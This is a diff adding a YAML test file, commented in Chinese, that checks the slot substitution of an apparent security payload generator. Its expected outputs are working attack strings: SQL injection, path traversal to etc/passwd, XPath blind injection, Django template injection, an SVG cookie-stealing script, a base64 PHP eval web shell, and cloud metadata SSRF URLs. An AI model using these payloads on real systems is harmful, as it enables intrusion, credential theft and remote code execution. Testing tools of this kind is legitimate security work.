@@ -1,0 +1,176 @@
+# 参数化的黄金样本：证明这一轮**新加的那些槽位真的接到了 body 上**。
+#
+# 为什么单开一份：老模板的参数化样本容易写成「只跑一遍默认值」——默认值恰好等于
+# 改动前的产出，于是「槽位声明了但 body 里忘了接」这种错永远测不出来。
+# 这里每一条都**故意选非默认值**，产出必须跟着变。
+#
+# 期望值全部照着 data/ 里的 body 手推。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= MySQL：库名不再写死 =================
+
+  - name: MySQL 读表名 · 指定库名
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: named}
+      vars: {db: security}
+      outputs: [raw]
+    expect:
+      # 子句槽位选 named 时是 " WHERE table_schema='<<db>>'"，变量在下一阶段替换
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema='security' -- -"
+
+  - name: MySQL 读表名 · 不限库
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: any}
+      outputs: [raw]
+    expect:
+      # 空格写在子句里，所以这一档不会在 tables 后面留下多余空白
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables -- -"
+
+  - name: MySQL 读表名 · mysql 库
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: mysql, cols: "4", pos: "2"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='mysql' -- -"
+
+  # ================= 穿越层级交给 <<rep>> =================
+
+  - name: 穿越序列变形 · 两层
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      slots: {depth: "2"}
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      # depth=2 → <<rep>> 把 form.seq 重复两次。以前 body 里硬写三份，改不了
+      payload: "....//....//etc/passwd"
+
+  - name: 穿越序列变形 · 过长 UTF-8 编码
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      slots: {form: overlong}
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      # form 换了一档，depth 仍是默认 3
+      payload: "..%c0%af..%c0%af..%c0%afetc/passwd"
+
+  # ================= XPath：节点下标不再写死 =================
+
+  - name: XPath 逐字符提取 · 第 3 个节点
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.substring
+      slots: {idx: "3"}
+      vars: {pos: "1", ch: a}
+      outputs: [raw]
+    expect:
+      payload: "' or substring(//user[3]/password,1,1)='a' or '1'='2"
+
+  - name: XPath 探长度 · 第 2 个节点
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.length
+      slots: {idx: "2"}
+      vars: {n: "5"}
+      outputs: [raw]
+    expect:
+      payload: "' or string-length(//user[2]/password)=5 or '1'='2"
+
+  - name: XPath 猜节点名 · 第 2 个节点
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.name
+      slots: {idx: "2"}
+      vars: {name: user}
+      outputs: [raw]
+    expect:
+      payload: "' or name(//*[2])='user' or '1'='2"
+
+  # ================= 其余写死项 =================
+
+  - name: Django 配置泄露 · 换配置项
+    state:
+      vuln: ssti
+      template: ssti.python.django.settings
+      slots: {key: DATABASES}
+      outputs: [raw]
+    expect:
+      payload: "{{settings.DATABASES}}"
+
+  - name: SVG 携带脚本 · 换脚本内容
+    state:
+      vuln: upload
+      template: upload.generic.content.svg
+      slots: {js: "alert(document.cookie)"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" standalone="no"?>
+        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+          <script type="text/javascript">alert(document.cookie)</script>
+        </svg>
+      syntax: ok
+
+  - name: data:// base64 · 换代码
+    state:
+      vuln: lfi
+      template: lfi.generic.data.base64
+      slots: {code: phpinfo}
+      outputs: [raw]
+    expect:
+      # 这个 base64 是独立算出来核对过的：PD9waHAgcGhwaW5mbygpOyA/Pg== → <?php phpinfo(); ?>
+      payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+
+  - name: data:// base64 · eval
+    state:
+      vuln: lfi
+      template: lfi.generic.data.base64
+      slots: {code: eval_post}
+      outputs: [raw]
+    expect:
+      payload: "data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="
+
+  # ================= SSRF 云元数据 =================
+
+  - name: 云元数据 · Azure IMDS
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: azure}
+      outputs: [raw]
+    expect:
+      # 这条要额外带 Metadata: true 请求头，选项名里写了，载荷本身带不了
+      payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+  - name: 云元数据 · Oracle Cloud
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: oracle}
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/opc/v2/instance/"
+
+  - name: 云元数据 · AWS ECS
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: aws_ecs}
+      outputs: [raw]
+    expect:
+      # ECS 的凭证挂在另一个地址上（169.254.170.2），和通用的 169.254.169.254 不是一回事
+      payload: "http://169.254.170.2/v2/metadata"
